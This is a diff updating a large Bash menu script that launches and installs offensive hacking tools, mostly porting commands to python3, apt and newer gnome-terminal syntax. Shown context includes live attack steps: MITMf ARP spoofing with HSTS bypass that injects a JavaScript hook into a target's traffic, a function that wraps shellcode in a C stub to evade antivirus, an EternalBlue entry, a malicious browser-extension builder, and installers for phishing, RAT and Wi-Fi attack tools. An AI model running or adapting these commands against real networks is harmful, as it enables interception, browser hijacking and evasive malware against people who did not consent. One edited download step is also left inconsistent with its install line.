-		exec bash "$0"
+		exec bash "$LPATH/l"
 	elif [[ "$METASP" = "0" ]]
 	then
 		clear
@@ -6343,7 +6347,7 @@ function update_lscript
 				echo -e "$PAKTC"
 				$READAK
 				cd "$LPATH"
-				gnome-terminal -e ./install.sh
+				gnome-terminal -- ./install.sh
 				clear 
 				sleep 1
 				rm -rf /root/lscriptold
@@ -6354,7 +6358,7 @@ function update_lscript
 				clear
 				echo -e "You didnt select "y" so you go back..."
 				sleep 3
-				exec bash "$0"
+				exec bash "$LPATH/l"
 			fi
 		else
 			echo -e "There is no update available"
@@ -6365,7 +6369,7 @@ function update_lscript
 			sleep 1
 			echo -e "$PAKTGB"
 			$READAK	
-			exec bash "$0"
+			exec bash "$LPATH/l"
 		fi
 	else
 		clear
@@ -6375,7 +6379,7 @@ function update_lscript
 		echo -e ""
 		echo -e "$PAKTGB"
 		$READAK
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	fi	
 }
 function hidden_shortcuts
@@ -6428,24 +6432,12 @@ function one_time_per_launch_ks
 }
 function interface_menu
 {
-	WLANN=$(cat "$LPATH"/wlan.txt)
-	WLANNM=$(cat "$LPATH"/wlanmon.txt)
-	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
-	sleep 2
-	echo -e "Do you want to change you interface names?"$YNYES": "
-	read INAG
-	if [[ "$INAG" = "n" ]]
-	then
-		clear
-		echo -e "Then why did you come here? lol"
-		sleep 3
-		exec bash "$0"
-	else
-		clear
-		rm "$LPATH"/wlan.txt
-		rm "$LPATH"/wlanmon.txt
-		set_interface_number
-	fi
+[[ -f /root/lscript/wlan.txt ]]    && WLANN=$(cat /root/lscript/wlan.txt)
+[[ -f /root/lscript/wlanmon.txt ]] && WLANNM=$(cat /root/lscript/wlanmon.txt)
+echo -e "Current: ${YS}${WLANN}${CE} / monitor: ${YS}${WLANNM}${CE}"
+sleep 1
+rm -f /root/lscript/wlan.txt /root/lscript/wlanmon.txt
+set_interface_number
 }
 function tools_menu
 {
@@ -6550,7 +6542,7 @@ function public_ip
 		echo -e "$PAKTGB"
 		$READAK
 		clear
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	fi
 }
 function terms_of_use
@@ -6576,7 +6568,7 @@ function terms_of_use
 		echo -e "You didn't type 'YES' , so you cannot continue"
 		sleep 4
 	fi
-	exec bash "$0"
+	exec bash "$LPATH/l"
 }
 function eternalblue
 {
@@ -6861,7 +6853,7 @@ function new_terminal
 			echo -e "$PAKTGB"
 			$READAK
 			clear
-			exec bash "$0"
+			exec bash "$LPATH/l"
 		else
 			CHECKWL=$(ifconfig | grep "$WLANN")
 			if [[ "$CHECKWL" == "" ]]
@@ -6881,26 +6873,26 @@ function new_terminal
 			sleep 1
 			FJC=0
 			export FJC
-			gnome-terminal --geometry 87x35+9999+0 -- lh1
+			gnome-terminal -- bash -c "bash \"$LPATH/lh1\""
 			sleep 1
-			exec bash "$0"
+			exec bash "$LPATH/l"
 			break
 		elif [[ "$YORNAA" = "11" ]]
 		then
 			clear
 			echo -e "Moving into new terminal..."
 			sleep 1
-			gnome-terminal --geometry 80x25+9999+0 -- lh3
+			gnome-terminal -- bash -c "bash \"$LPATH/lh3\""
 			sleep 1
-			exec bash "$0"
+			exec bash "$LPATH/l"
 			break
 		elif [[ "$YORNAA" = "12" ]]
 		then
 			echo -e "Moving into new terminal..."
 			sleep 1
-			gnome-terminal --geometry 80x25+9999+0 -- lh4
+			gnome-terminal -- bash -c "bash \"$LPATH/lh4\""
 			sleep 1
-			exec bash "$0"
+			exec bash "$LPATH/l"
 			break
 		fi
 	fi
@@ -7642,7 +7634,7 @@ function cromos_menu
 			then
 				echo -e "Extension ID: "
 				read EXID
-				python cromos.py --extension "$EXID" && CEX=""$YS"$EXID"$CE""
+				python3 cromos.py --extension "$EXID" && CEX=""$YS"$EXID"$CE""
 				sleep 2
 			elif [[ "$CROM" == 2 ]]
 			then
@@ -7654,7 +7646,7 @@ function cromos_menu
 				fi
 			elif [[ "$CROM" == 3 ]]
 			then
-				python cromos.py --extension "$EXID" --load "$CMOD"
+				python3 cromos.py --extension "$EXID" --load "$CMOD"
 				sleep 2
 			elif [[ "$CROM" == 4 ]]
 			then
@@ -7664,14 +7656,14 @@ function cromos_menu
 				then
 					buildext="bat"
 				fi
-				python cromos.py --extension "$EXID" --build "$buildext" && xdg-open /root/cromos/output/builds
+				python3 cromos.py --extension "$EXID" --build "$buildext" && xdg-open /root/cromos/output/builds
 				echo -e "$PAKTGB"
 				$READAK
 			elif [[ "$CROM" == 5 ]]
 			then
 				echo -e "Token: "
 				read CTOK
-				python cromos.py --extension "$EXID" --token "$CTOK"
+				python3 cromos.py --extension "$EXID" --token "$CTOK"
 				echo -e "$PAKTGB"
 				$READAK
 			elif [[ "$CROM" == "b" || "$CROM" == "back" ]]
@@ -7749,7 +7741,7 @@ function mitmf_hook
 			export mitmfhook
 			cd /root/MITMf
 			clear
-			python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
+			python3 mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
 			cd
 		fi
 	else
@@ -8373,7 +8365,7 @@ function ngrok_option
 					read AUTHT
 					if [[ "$AUTHT" != "" ]]
 					then
-						./ngrok authtoken $AUTHT
+						ngrok config add-authtoken $AUTHT
 						echo -e "$PAKTGB"
 						$READAK
 					fi
@@ -8490,11 +8482,10 @@ do
 	export ZERO
 	echo -e ""$BS"Scanning, please wait..."$CE""
 	tempfile="/root/lscript/tempscan.txt"
-	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile"
-	#gnome-terminal -- arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile
+	rm -f "$tempfile"
+	arp-scan -I "$IPF" "$ZERO"/24 2>/dev/null | tee "$tempfile"
 	clear
-	######
-	T1=$(cat $tempfile | grep "Ending arp-scan")
+	T1=$(grep "Ending arp-scan" "$tempfile" 2>/dev/null)
 	if [[ "$T1" = "" ]]
 	then
 		lines=$(cat $tempfile | awk 'END{print NR}')
@@ -8881,9 +8872,9 @@ function browser_exploiting
 							clear
 							if [[ "$wholenetwork" == 0 ]]
 							then
-								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
+								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python3 mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
 							else
-								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
+								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python3 mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
 							fi
 							cd
 						else
@@ -9234,7 +9225,7 @@ function undetectable1
 	echo "\"$randomshit\";" >> "$TXT"
 	cat "$DIRECTORY" >> "$TXT"
 	echo "int main(void) { ((void (*)())buf)();}" >> "$TXT"
-	leafpad "$TXT"
+	mousepad "$TXT"
 }
 function main_options
 {
@@ -9297,7 +9288,7 @@ function main_options
 		IFTOPT=$(which iftop)
 		if [[ "$IFTOPT" == "" ]]
 		then
-			apt-get -y install iftop
+			apt -y install iftop
 		fi
 		CHECK=$(ifconfig | grep "$iftopint")
 		if [[ "$CHECK" = "" ]]
@@ -9446,10 +9437,10 @@ function main_options
 	elif [[ "$YORNAA" = "9" ]]
 	then
 		tools_menu
-	elif [[ "$YORNAA" = "l" ]]
+	elif [[ "$YORNAA" = "lzsc" ]]
 	then
-		clear 
-		exec bash "$0"
+		clear
+		exec bash "$LPATH/l"
 	elif [[ "$YORNAA" = "gg" ]]
 	then
 		geany /bin/lscript/l
@@ -9648,7 +9639,7 @@ function main_options
 	elif [[ "$YORNAA" = "" ]]
 	then
 		clear
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	elif [[ "$YORNAA" = "errors" ]]
 	then
 		errors_menu
@@ -9766,7 +9757,7 @@ check_if_ks
 		gitlink="--recursive  https://github.com/FluxionNetwork/fluxion.git"
 		install_default
 		#~ wget https://fluxion.tk/fluxion-unstable.zip
-		#~ apt-get install -y unzip
+		#~ apt install -y unzip
 		#~ clear
 		#~ unzip /root/fluxion*.zip -d /root
 		#~ cd /root/fluxion/install
@@ -9775,7 +9766,7 @@ check_if_ks
 	}
 	function install_wifite
 	{
-		apt-get install -y wifite
+		apt install -y wifite
 	}
 	function install_wifiphisher
 	{
@@ -9785,7 +9776,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			sudo python setup.py install
+			sudo python3 setup.py install
 		fi
 	}
 	function install_zatacker
@@ -9807,7 +9798,7 @@ check_if_ks
 	}
 	function install_osrframework
 	{
-		pip install osrframework
+		pip3 install osrframework
 	}
 	function install_hakku
 	{
@@ -9829,7 +9820,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			sudo python install.py	
+			sudo python3 install.py	
 		fi
 	}
 	function install_cupp
@@ -9873,14 +9864,14 @@ check_if_ks
 	}
 	function install_kickthemout
 	{
-		apt-get install -y nmap
+		apt install -y nmap
 		foldname="kickthemout"
 		gitlink="https://github.com/k4m4/kickthemout.git"
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			sudo python -m pip install -r requirements.txt
+			sudo python3 -m pip3 install -r requirements.txt
 		fi
 	}
 	function install_ghostphisher
@@ -9937,7 +9928,7 @@ check_if_ks
 		if [[ "$cloned" == 1 ]]
 		then
 			sh dependencies
-			python install
+			python3 install
 		fi
 	}
 	function install_airgeddon
@@ -9963,8 +9954,8 @@ check_if_ks
 			./4nonimizer install
 			clear
 			cd
-			apt-get install -y python-pip
-			apt-get install -y php-curl
+			apt install -y python3-pip
+			apt install -y php-curl
 			gem install pcaprub
 			gem install packetfu	
 		fi
@@ -9980,8 +9971,8 @@ check_if_ks
 			chmod +x install.sh
 			./install.sh
 			cd
-			apt-get install -y python-pip
-			apt-get install -y php-curl
+			apt install -y python3-pip
+			apt install -y php-curl
 			gem install pcaprub
 			gem install packetfu
 		fi
@@ -10008,7 +9999,7 @@ check_if_ks
 			git submodule init
 			git submodule update
 			cd pupy
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 		fi
 	}
 	function install_zirikatu
@@ -10087,7 +10078,7 @@ check_if_ks
 		fi
 		echo -e "Downloading angryipscanner"
 		sleep 2
-		wget https://github.com/angryip/ipscan/releases/download/3.5.2/ipscan_3.5.2_amd64.deb
+		wget https://github.com/angryip/ipscan/releases/download/3.9.1/ipscan_3.9.1_amd64.deb
 		echo -e "Installing..."
 		dpkg -i ipscan_3.5.2*
 		echo -e "Done"
@@ -10145,9 +10136,9 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			apt-get install python3-pip
-			python3 -m pip install -r requirements.txt
-			python setup.py install
+			apt install python3-pip
+			python3 -m pip3 install -r requirements.txt
+			python3 setup.py install
 		fi
 	}
 	function install_infoga
@@ -10158,7 +10149,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 		fi
 	}
 	function install_nwatch
@@ -10169,10 +10160,10 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install scapy
-			pip install colorama
-			pip install nmap
-			pip install ctypes
+			pip3 install scapy
+			pip3 install colorama
+			pip3 install nmap
+			pip3 install ctypes
 			pip2.7 install scapy
 			pip2.7 install colorama
 			pip2.7 install nmap
@@ -10187,7 +10178,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			apt-get install -y masscan metasploit-framework
+			apt install -y masscan metasploit-framework
 		fi
 	}
 	function install_eaphammer
@@ -10200,7 +10191,7 @@ check_if_ks
 		then
 			chmod +x kali-setup
 			./kali-setup
-			apt-get install -y python-tqdm
+			apt install -y python3-tqdm
 		fi
 	}
 	function install_dagon
@@ -10211,9 +10202,9 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			pip2.7 install -r requirements.txt
-			apt-get install -y bcrypt
+			apt install -y bcrypt
 		fi
 	}
 	function install_lalin
@@ -10235,7 +10226,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requeriments.txt
+			pip3 install -r requeriments.txt
 		fi
 	}
 	function install_kwetza
@@ -10246,7 +10237,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install beautifulsoup4
+			pip3 install beautifulsoup4
 			pip2.7 install beautifulsoup4
 		fi
 	}
@@ -10269,28 +10260,28 @@ check_if_ks
 	}
 	function install_netdiscover
 	{
-		apt-get install -y netdiscover	
+		apt install -y netdiscover	
 	}
 	function install_websploit
 	{
-		apt-get install -y websploit
+		apt install -y websploit
 	}
 	function install_openvas
 	{
-		apt-get install -y openvas
-		openvas-setup
+		apt install -y openvas
+		gvm-setup
 	}
 	function install_shellter
 	{
-		apt-get install -y shellter
+		apt install -y shellter
 	}
 	function install_geany
 	{
-		apt-get install -y geany
+		apt install -y geany
 	}
 	function install_bleachbit
 	{
-		apt-get install -y bleachbit
+		apt install -y bleachbit
 	}
 	function install_vmr
 	{
@@ -10340,7 +10331,7 @@ check_if_ks
 	}
 	function install_howdoi
 	{
-		pip install howdoi
+		pip3 install howdoi
 		pip2.7 install howdoi
 	}
 	function install_operative
@@ -10351,7 +10342,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			pip2.7 install -r requirements.txt
 		fi
 	}
@@ -10370,7 +10361,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			pip2.7 install -r requirements.txt
 		fi
 	}
@@ -10441,7 +10432,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements
+			pip3 install -r requirements
 			pip2.7 install -r requirements
 		fi
 	}
@@ -10470,7 +10461,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			python install.py
+			python3 install.py
 		fi
 	}
 	function install_arcanus
@@ -10481,7 +10472,7 @@ check_if_ks
 	}
 	function install_msfpc
 	{
-		apt-get install -y msfpc
+		apt install -y msfpc
 	}
 	function install_morphhta
 	{
@@ -10503,7 +10494,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			apt-get install -y mingw-w64
+			apt install -y mingw-w64
 		fi
 	}
 	function install_demiguise
@@ -10526,17 +10517,17 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			python installer.py
+			python3 installer.py
 			chmod +x /usr/bin/sechub
 		fi
 	}
 	function install_beef
 	{
-		apt-get install beef-xss
+		apt install beef-xss
 	}
 	function install_mitmf
 	{
-		apt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
+		apt -y install python3-dev python3-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
 		foldname="MITMf"
 		gitlink="https://github.com/byt3bl33d3r/MITMf"
 		install_default
@@ -10545,13 +10536,13 @@ check_if_ks
 		then
 			git submodule init
 			git submodule update --recursive
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			pip2.7 install -r requirements.txt
 		fi
 	}
 	function install_arp_scan
 	{
-		apt-get -y install arp-scan
+		apt -y install arp-scan
 	}
 	function install_netool
 	{
@@ -10566,7 +10557,7 @@ check_if_ks
 	}
 	function install_sqlmap
 	{
-		apt-get install sqlmap
+		apt install sqlmap
 	}
 	function install_patator
 	{
@@ -10582,7 +10573,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			pip2.7 install -r requirements.txt
 		fi
 	}
@@ -10605,7 +10596,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			python setup.py install
+			python3 setup.py install
 		fi
 	}
 	function install_eggshell
@@ -10617,7 +10608,7 @@ check_if_ks
 		if [[ "$cloned" == 1 ]]
 		then
 			easy_install pycrypto
-			python eggshell.py
+			python3 eggshell.py
 		fi
 	}
 	function install_zerodoor
@@ -10636,7 +10627,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			python setup.py
+			python3 setup.py
 		fi
 	}
 	function install_cromos
@@ -10647,7 +10638,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			python setup.py
+			python3 setup.py
 		fi
 	}
 	function install_fsociety
@@ -10672,7 +10663,7 @@ check_if_ks
 		then
 			chmod 777 wafninja joomscan install-perl-module.sh yuki.sh
 			chmod 777 Module/WhatWeb/whatweb
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			chmod +x *.sh
 			./install-perl-module.sh
 		fi
@@ -10685,7 +10676,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			pip2.7 install -r requirements.txt
 		fi
 	}
@@ -10703,7 +10694,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 		fi
 	}
 	function install_striker
@@ -10714,7 +10705,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 		fi
 	}
 	function install_hyprpulse
@@ -10753,7 +10744,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install -r requirements.txt
+			pip3 install -r requirements.txt
 			pip2.7 install -r requirements.txt
 		fi
 	}
@@ -10771,7 +10762,7 @@ check_if_ks
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			pip install --upgrade --force-reinstall -r requirements.txt
+			pip3 install --upgrade --force-reinstall -r requirements.txt
 			pip2.7 install --upgrade --force-reinstall -r requirements.txt
 		fi
 	}
@@ -10843,12 +10834,12 @@ then
 	main_options
 	if [[ "$BACKL" = "1" ]]
 	then
-		exec bash "$0"
+		exec bash "$LPATH/l"
 		
 	else
 		echo -e "$PAKTGB"
 		$READAK
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	fi
 else
 	terms_of_use
